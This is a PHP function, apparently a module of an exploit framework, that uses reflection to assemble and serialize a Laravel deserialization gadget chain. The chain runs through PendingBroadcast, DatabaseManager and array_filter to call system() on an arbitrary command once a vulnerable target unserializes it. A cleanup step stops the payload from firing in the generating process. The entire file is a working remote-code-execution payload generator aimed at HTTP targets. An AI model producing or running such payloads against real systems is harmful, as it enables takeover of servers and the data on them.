<?php
// Serialize installed classes, leaving command execution to the HTTP target.
function module_target_laravel_command(string $command): string
{
    $assign = static function (object $object, string $name, mixed $value): void {
        (new ReflectionProperty($object, $name))->setValue($object, $value);
    };
    $manager = (new ReflectionClass(Illuminate\Database\DatabaseManager::class))->newInstanceWithoutConstructor();
    $assign($manager, 'app', ['config' => [
        'database.default' => 'system',
        'database.connections' => ['system' => [$command]],
    ]]);
    $assign($manager, 'extensions', ['system' => 'array_filter']);
    $broadcast = (new ReflectionClass(Illuminate\Broadcasting\PendingBroadcast::class))->newInstanceWithoutConstructor();
    $assign($broadcast, 'events', $manager);
    try {
        return serialize([7 => $broadcast]);
    } finally {
        // Generation must not execute its proof in this CLI process.
        $assign($broadcast, 'events', new Illuminate\Events\Dispatcher());
        $assign($broadcast, 'event', 'module-target-noop');
    }
}
